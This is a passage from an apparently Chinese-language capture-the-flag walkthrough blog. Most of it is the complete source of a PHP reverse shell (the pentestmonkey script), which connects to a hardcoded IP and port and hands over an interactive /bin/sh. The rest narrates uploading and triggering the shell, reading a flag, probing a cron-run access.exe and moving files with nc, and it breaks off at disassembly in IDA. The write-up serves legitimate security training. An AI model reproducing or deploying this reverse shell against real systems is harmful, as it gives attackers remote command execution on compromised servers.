Inc.,</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token comment">// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token comment">// This tool may be used for legal purposes only.  Users take full responsibility</span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token comment">// for any actions performed using this tool.  If these terms are not acceptable to</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token comment">// you, then do not use this tool.</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token comment">// You are encouraged to send comments, improvements or suggestions to</span></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token comment">// me at pentestmonkey@pentestmonkey.net</span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token comment">// Description</span></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token comment">// -----------</span></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token comment">// This script will make an outbound TCP connection to a hardcoded IP and port.</span></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token comment">// The recipient will be given a shell running as the current user (apache normally).</span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token comment">// Limitations</span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token comment">// -----------</span></pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token comment">// proc_open and stream_set_blocking require PHP version 4.3+, or 5+</span></pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token comment">// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.</span></pre></td></tr><tr><td data-num="41"></td><td><pre><span class="token comment">// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.</span></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="43"></td><td><pre><span class="token comment">// Usage</span></pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token comment">// -----</span></pre></td></tr><tr><td data-num="45"></td><td><pre><span class="token comment">// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.</span></pre></td></tr><tr><td data-num="46"></td><td><pre></pre></td></tr><tr><td data-num="47"></td><td><pre><span class="token function">set_time_limit</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="48"></td><td><pre><span class="token variable">$VERSION</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1.0"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="49"></td><td><pre><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">;</span>  <span class="token comment">// CHANGE THIS</span></pre></td></tr><tr><td data-num="50"></td><td><pre><span class="token variable">$port</span> <span class="token operator">=</span> <span class="token number">1234</span><span class="token punctuation">;</span>       <span class="token comment">// CHANGE THIS</span></pre></td></tr><tr><td data-num="51"></td><td><pre><span class="token variable">$chunk_size</span> <span class="token operator">=</span> <span class="token number">1400</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="52"></td><td><pre><span class="token variable">$write_a</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="53"></td><td><pre><span class="token variable">$error_a</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="54"></td><td><pre><span class="token variable">$shell</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'uname -a; w; id; /bin/sh -i'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="55"></td><td><pre><span class="token variable">$daemon</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="56"></td><td><pre><span class="token variable">$debug</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="57"></td><td><pre></pre></td></tr><tr><td data-num="58"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="59"></td><td><pre><span class="token comment">// Daemonise ourself if possible to avoid zombies later</span></pre></td></tr><tr><td data-num="60"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="61"></td><td><pre></pre></td></tr><tr><td data-num="62"></td><td><pre><span class="token comment">// pcntl_fork is hardly ever available, but will allow us to daemonise</span></pre></td></tr><tr><td data-num="63"></td><td><pre><span class="token comment">// our php process and avoid zombies.  Worth a try...</span></pre></td></tr><tr><td data-num="64"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pcntl_fork'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="65"></td><td><pre>	<span class="token comment">// Fork and have the parent process exit</span></pre></td></tr><tr><td data-num="66"></td><td><pre>	<span class="token variable">$pid</span> <span class="token operator">=</span> <span class="token function">pcntl_fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="67"></td><td><pre>	</pre></td></tr><tr><td data-num="68"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$pid</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="69"></td><td><pre>		<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR: Can't fork"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="70"></td><td><pre>		<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="71"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="72"></td><td><pre>	</pre></td></tr><tr><td data-num="73"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$pid</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="74"></td><td><pre>		<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Parent exits</span></pre></td></tr><tr><td data-num="75"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="76"></td><td><pre></pre></td></tr><tr><td data-num="77"></td><td><pre>	<span class="token comment">// Make the current process a session leader</span></pre></td></tr><tr><td data-num="78"></td><td><pre>	<span class="token comment">// Will only succeed if we forked</span></pre></td></tr><tr><td data-num="79"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">posix_setsid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="80"></td><td><pre>		<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Error: Can't setsid()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="81"></td><td><pre>		<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="82"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="83"></td><td><pre></pre></td></tr><tr><td data-num="84"></td><td><pre>	<span class="token variable">$daemon</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="85"></td><td><pre><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="86"></td><td><pre>	<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"WARNING: Failed to daemonise.  This is quite common and not fatal."</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="87"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="88"></td><td><pre></pre></td></tr><tr><td data-num="89"></td><td><pre><span class="token comment">// Change to a safe directory</span></pre></td></tr><tr><td data-num="90"></td><td><pre><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="91"></td><td><pre></pre></td></tr><tr><td data-num="92"></td><td><pre><span class="token comment">// Remove any umask we inherited</span></pre></td></tr><tr><td data-num="93"></td><td><pre><span class="token function">umask</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="94"></td><td><pre></pre></td></tr><tr><td data-num="95"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="96"></td><td><pre><span class="token comment">// Do the reverse shell...</span></pre></td></tr><tr><td data-num="97"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="98"></td><td><pre></pre></td></tr><tr><td data-num="99"></td><td><pre><span class="token comment">// Open reverse connection</span></pre></td></tr><tr><td data-num="100"></td><td><pre><span class="token variable">$sock</span> <span class="token operator">=</span> <span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$port</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="101"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$sock</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="102"></td><td><pre>	<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$errstr</span></span> (<span class="token interpolation"><span class="token variable">$errno</span></span>)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="103"></td><td><pre>	<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="104"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="105"></td><td><pre></pre></td></tr><tr><td data-num="106"></td><td><pre><span class="token comment">// Spawn shell process</span></pre></td></tr><tr><td data-num="107"></td><td><pre><span class="token variable">$descriptorspec</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span></pre></td></tr><tr><td data-num="108"></td><td><pre>   <span class="token number">0</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pipe"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment">// stdin is a pipe that the child will read from</span></pre></td></tr><tr><td data-num="109"></td><td><pre>   <span class="token number">1</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pipe"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment">// stdout is a pipe that the child will write to</span></pre></td></tr><tr><td data-num="110"></td><td><pre>   <span class="token number">2</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pipe"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span>   <span class="token comment">// stderr is a pipe that the child will write to</span></pre></td></tr><tr><td data-num="111"></td><td><pre><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="112"></td><td><pre></pre></td></tr><tr><td data-num="113"></td><td><pre><span class="token variable">$process</span> <span class="token operator">=</span> <span class="token function">proc_open</span><span class="token punctuation">(</span><span class="token variable">$shell</span><span class="token punctuation">,</span> <span class="token variable">$descriptorspec</span><span class="token punctuation">,</span> <span class="token variable">$pipes</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="114"></td><td><pre></pre></td></tr><tr><td data-num="115"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_resource</span><span class="token punctuation">(</span><span class="token variable">$process</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="116"></td><td><pre>	<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR: Can't spawn shell"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="117"></td><td><pre>	<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="118"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="119"></td><td><pre></pre></td></tr><tr><td data-num="120"></td><td><pre><span class="token comment">// Set everything to non-blocking</span></pre></td></tr><tr><td data-num="121"></td><td><pre><span class="token comment">// Reason: Occsionally reads will block, even though stream_select tells us they won't</span></pre></td></tr><tr><td data-num="122"></td><td><pre><span class="token function">stream_set_blocking</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="123"></td><td><pre><span class="token function">stream_set_blocking</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="124"></td><td><pre><span class="token function">stream_set_blocking</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="125"></td><td><pre><span class="token function">stream_set_blocking</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="126"></td><td><pre></pre></td></tr><tr><td data-num="127"></td><td><pre><span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Successfully opened reverse shell to <span class="token interpolation"><span class="token variable">$ip</span></span>:<span class="token interpolation"><span class="token variable">$port</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="128"></td><td><pre></pre></td></tr><tr><td data-num="129"></td><td><pre><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="130"></td><td><pre>	<span class="token comment">// Check for end of TCP connection</span></pre></td></tr><tr><td data-num="131"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="132"></td><td><pre>		<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR: Shell connection terminated"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="133"></td><td><pre>		<span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="134"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="135"></td><td><pre></pre></td></tr><tr><td data-num="136"></td><td><pre>	<span class="token comment">// Check for end of STDOUT</span></pre></td></tr><tr><td data-num="137"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="138"></td><td><pre>		<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR: Shell process terminated"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="139"></td><td><pre>		<span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="140"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="141"></td><td><pre></pre></td></tr><tr><td data-num="142"></td><td><pre>	<span class="token comment">// Wait until a command is end down $sock, or some</span></pre></td></tr><tr><td data-num="143"></td><td><pre>	<span class="token comment">// command output is available on STDOUT or STDERR</span></pre></td></tr><tr><td data-num="144"></td><td><pre>	<span class="token variable">$read_a</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="145"></td><td><pre>	<span class="token variable">$num_changed_sockets</span> <span class="token operator">=</span> <span class="token function">stream_select</span><span class="token punctuation">(</span><span class="token variable">$read_a</span><span class="token punctuation">,</span> <span class="token variable">$write_a</span><span class="token punctuation">,</span> <span class="token variable">$error_a</span><span class="token punctuation">,</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="146"></td><td><pre></pre></td></tr><tr><td data-num="147"></td><td><pre>	<span class="token comment">// If we can read from the TCP socket, send</span></pre></td></tr><tr><td data-num="148"></td><td><pre>	<span class="token comment">// data to process's STDIN</span></pre></td></tr><tr><td data-num="149"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$read_a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="150"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SOCK READ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="151"></td><td><pre>		<span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$chunk_size</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="152"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SOCK: <span class="token interpolation"><span class="token variable">$input</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="153"></td><td><pre>		<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="154"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="155"></td><td><pre></pre></td></tr><tr><td data-num="156"></td><td><pre>	<span class="token comment">// If we can read from the process's STDOUT</span></pre></td></tr><tr><td data-num="157"></td><td><pre>	<span class="token comment">// send data down tcp connection</span></pre></td></tr><tr><td data-num="158"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$read_a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="159"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"STDOUT READ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="160"></td><td><pre>		<span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$chunk_size</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="161"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"STDOUT: <span class="token interpolation"><span class="token variable">$input</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="162"></td><td><pre>		<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="163"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="164"></td><td><pre></pre></td></tr><tr><td data-num="165"></td><td><pre>	<span class="token comment">// If we can read from the process's STDERR</span></pre></td></tr><tr><td data-num="166"></td><td><pre>	<span class="token comment">// send data down tcp connection</span></pre></td></tr><tr><td data-num="167"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$read_a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="168"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"STDERR READ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="169"></td><td><pre>		<span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$chunk_size</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="170"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"STDERR: <span class="token interpolation"><span class="token variable">$input</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="171"></td><td><pre>		<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="172"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="173"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="174"></td><td><pre></pre></td></tr><tr><td data-num="175"></td><td><pre><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="176"></td><td><pre><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="177"></td><td><pre><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="178"></td><td><pre><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="179"></td><td><pre><span class="token function">proc_close</span><span class="token punctuation">(</span><span class="token variable">$process</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="180"></td><td><pre></pre></td></tr><tr><td data-num="181"></td><td><pre><span class="token comment">// Like print, but does nothing if we've daemonised ourself</span></pre></td></tr><tr><td data-num="182"></td><td><pre><span class="token comment">// (I can't figure out how to redirect STDOUT like a proper daemon)</span></pre></td></tr><tr><td data-num="183"></td><td><pre><span class="token keyword">function</span> <span class="token function-definition function">printit</span> <span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="184"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$daemon</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="185"></td><td><pre>		<span class="token keyword">print</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$string</span></span>\n"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="186"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="187"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="188"></td><td><pre></pre></td></tr><tr><td data-num="189"></td><td><pre><span class="token delimiter important">?></span></span></pre></td></tr></table></figure><p>联想到之前第一处可疑点，再返回查看发现变成了另外一个文件名，猜测就是上传的文件名</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211011213829019-72579412.png" alt="" /></p>
<p>这里访问 uploads 目录，会显示下面所有的文件名，只有这一个，而且还有上传时间，也能想到这就是我们上传的文件</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211011230642206-2029720214.png" alt="" /></p>
<p>访问该文件成功反弹 shell，提权到 tty</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211011230733754-1296607199.png" alt="" /></p>
<p>在 /home/fox 下发现一个 flag：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211011230747627-435739283.png" alt="" /></p>
<p>查看根目录下文件的权限，发现 root 目录其他用户具有可读权限：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211011230813777-724069557.png" alt="" /></p>
<p>进入之后，发现 proof.txt 文件，但是没有权限，还有一个 win 文件可读</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211011230828731-660512584.png" alt="" /></p>
<p>查看内容发现每隔三秒运行一下 access.exe 文件</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211011230916544-2038902722.png" alt="" /></p>
<p>进入到 /opt/access 目录发现两个文件</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211011230932361-1461813295.png" alt="" /></p>
<p>下载到本地，这里使用一种新方法，nc 传输</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211011230947055-1181242839.png" alt="" /></p>
<p>也可使用 python 在后台搭建简易 web 服务器：</p>
<pre><code>python -m SimpleHTTPServer 8000 &amp;
</code></pre>
<p>放到 windows 下运行，发现其运行在 23 号端口，一看这是要 pwn 啊</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211011231001266-956669801.png" alt="" /></p>
<p>将程序拖到 ida 里面分析，找到连接 23 端口所打印的字符串位置进行反编译</p>
